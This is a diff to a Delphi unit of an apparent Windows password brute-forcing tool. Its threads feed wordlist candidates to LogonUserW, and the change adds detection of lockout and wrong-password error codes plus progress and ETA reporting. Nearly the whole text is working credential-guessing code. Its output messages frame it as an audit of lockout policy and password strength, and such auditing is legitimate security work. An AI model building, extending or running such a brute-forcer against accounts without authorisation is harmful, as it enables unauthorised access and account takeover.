@@ -12,10 +12,17 @@ unit UntWorker;
 
 interface
 
-uses Classes, Windows, SysUtils, Generics.Collections, System.SyncObjs;
+uses Classes, Windows, SysUtils, Generics.Collections;
 
 type
   TWorkers = class;
+
+  TLogonStatus = (
+                      lsFound,
+                      lsWrong,
+                      lsLocked,
+                      lsError
+  );
 
   TWorker = class(TThread)
   private
@@ -46,6 +53,7 @@ type
     FDomainName     : String;
 
     FPasswordResult : String;
+    FLocked         : Integer;
 
     {@M}
     function Build() : Int64;
@@ -58,14 +66,16 @@ type
     function Start() : Boolean;
 
     {@G/S}
-    property Count  : Int64 read FCount   write FCount;
+    property Count  : Int64   read FCount   write FCount;
+    property Cursor : Int64   read FCursor  write FCursor;
+    property Locked : Integer read FLocked  write FLocked;
 
     {@G}
-    property Cursor     : Int64               read FCursor;
     property WordList   : TThreadList<String> read FWordList;
     property UserName   : String              read FUserName;
     property DomainName : String              read FDomainName;
 
+    {@S}
     property PasswordResult : String write FPasswordResult;
   end;
 
@@ -87,31 +97,52 @@ var ARet       : Int64;
     AList      : TList<String>;
     ACandidate : String;
 
-    {
-      Exploited Windows API for Bruteforcing
-    }
-    function AttemptLogin(AUserName, APassword : String; ADomain : String = '') : Boolean;
-    var AToken : THandle;
+  {
+    Exploited Windows API for Bruteforcing
+  }
+  function AttemptLogin(AUserName, APassword : String; ADomain : String = '') : TLogonStatus;
+  var AToken : THandle;
+      b      : Boolean;
 
-    const LOGON32_LOGON_INTERACTIVE = 2;
-          LOGON32_PROVIDER_DEFAULT  = 0;
+  const LOGON32_LOGON_INTERACTIVE = 2;
+        LOGON32_PROVIDER_DEFAULT  = 0;
 
-    begin
-      result := LogonUserW(
-                             PWideChar(AUserName),
-                             PWideChar(ADomain),
-                             PWideChar(APassword),
-                             LOGON32_LOGON_INTERACTIVE, // TODO: Play with other flags
-                             LOGON32_PROVIDER_DEFAULT,
-                             AToken
-      );
+  begin
+    result := lsError;
+    ///
 
-      if NOT result then
-        Exit();
+    b := LogonUserW(
+                       PWideChar(AUserName),
+                       PWideChar(ADomain),
+                       PWideChar(APassword),
+                       LOGON32_LOGON_INTERACTIVE,
+                       LOGON32_PROVIDER_DEFAULT,
+                       AToken
+    );
 
-      ///
-      CloseHandle(AToken);
+    case GetLastError of
+      {
+        Account Lockout Policy is set, account was locked!
+      }
+      1909 : begin
+        result := lsLocked;
+      end;
+
+      {
+        Password is incorrect
+      }
+      1326 : begin
+        result := lsWrong;
+      end;
     end;
+
+    if b then
+      result := lsFound;
+
+    if (AToken > 0) then
+      CloseHandle(AToken);
+  end;
+
 begin
   try
     if NOT Assigned(FOwner) then
@@ -136,13 +167,25 @@ begin
         FOwner.WordList.UnlockList();
       end;
 
-      if AttemptLogin(FUserName, ACandidate, FDomainName) then begin
-        TThread.Synchronize(self, procedure begin
-          FOwner.FPasswordResult := ACandidate;
-        end);
+      case AttemptLogin(FUserName, ACandidate, FDomainName) of
+        lsFound : begin
+          TThread.Synchronize(self, procedure begin
+            FOwner.FPasswordResult := ACandidate;
+          end);
 
-        ///
-        break;
+          ///
+          break;
+        end;
+
+        lsLocked : begin
+          AtomicIncrement(FOwner.Locked);
+
+          ///
+          break;
+        end;
+
+        lsWrong: ; // If you want more verbose, place some code here
+        lsError: ; // If you want more verbose, place some code here
       end;
     end;
   finally
@@ -183,10 +226,12 @@ end;
 function TWorkers.Start() : Boolean;
 var I                : Integer;
     AWorker          : TWorker;
-    AMessage         : TMsg;
     AProcCount       : Integer;
     AWordPerSec      : Int64;
     AEllapsedSeconds : Integer;
+    AProgress        : Integer;
+    AETACalc         : Extended;
+    ADummy           : Integer;
 
     {
       Gracefully Terminate Thread
@@ -206,6 +251,15 @@ var I                : Integer;
     end;
 
 begin
+  result := False;
+  ///
+
+  if (FCount = 0) then begin
+    Debug('Wordlist contains zero items. Operation aborted!', dlError, True);
+
+    Exit();
+  end;
+
   {
     Create Threads (Max Thread = Available Process Cores)
   }
@@ -229,7 +283,7 @@ begin
   {
     Monitoring Thread Execution
   }
-  AWordPerSec      := 1;
+  AWordPerSec      := 0;
   AEllapsedSeconds := 0;
 
   while True do begin
@@ -238,18 +292,29 @@ begin
 
     Inc(AEllapsedSeconds);
 
-    Write(#13 + Format('Progress: %d/%d (%d%%) - %d password/s, ETA:%s', [
-                                                    FCursor,
-                                                    FCount,
-                                                    ((FCursor * 100) div FCount),
-                                                    (FCursor - AWordPerSec),
-                                                    FormatDateTime('hh:nn:ss', (((FCount div (FCursor - AWordPerSec) - AEllapsedSeconds) / SecsPerDay)))
+    if (AWordPerSec > 0) then begin
+      AProgress := ((FCursor * 100) div FCount);
+      ///
 
-    ]));
+      ADummy := (FCursor - AWordPerSec);
+
+      if (ADummy > 0) then begin
+        AETACalc := (((FCount div ADummy) - AEllapsedSeconds) / SecsPerDay);
+
+        Write(#13 + Format('Progress: %d/%d (%d%%) - %d password/s, ETA:%s', [
+                                                        FCursor,
+                                                        FCount,
+                                                        AProgress,
+                                                        (FCursor - AWordPerSec),
+                                                        FormatDateTime('hh:nn:ss', AETACalc)
+
+        ]));
+      end;
+    end;
 
     AWordPerSec := FCursor;
 
-    if (FPasswordResult <> '') or (FCursor >= FCount) then
+    if (FPasswordResult <> '') or (FCursor >= FCount) or (FLocked > 0) then
       break;
   end;
   Write(#13 + '');
@@ -257,10 +322,17 @@ begin
   {
     Check if we found the password
   }
-  if (FPasswordResult <> '') then begin
+  result := (FPasswordResult <> '');
+  if result then begin
     Debug(Format('Password for username=[%s] and domain=[%s] found = [%s] ', [FUserName, FDomainName, FPasswordResult]), dlSuccess, True);
+    Debug('You should implement lockdown policy and follow guidelines to create a secure account password!', dlWarning, True);
   end else begin
-    Debug(Format('Password not found for username=[%s] and domain=[%s]', [FUserName, FDomainName]), dlError, True);
+    if (FLocked > 0) then begin
+      Debug(Format('Username=[%s] account was locked due to lockdown policy. You are safe!', [FUserName]), dlWarning, True);
+    end else begin
+      Debug(Format('Password not found for username=[%s] and domain=[%s].', [FUserName, FDomainName]), dlError, True);
+      Debug('Lockdown policy seems to be missing, you should implement it!', dlWarning, True);
+    end;
   end;
 
   {
@@ -354,6 +426,7 @@ begin
   FThreadPool  := TList<TWorker>.Create();
 
   FPasswordResult := '';
+  FLocked         := 0;
 
   if (FDomainName = '') then
     FDomainName := GetEnvironmentVariable('USERDOMAIN');
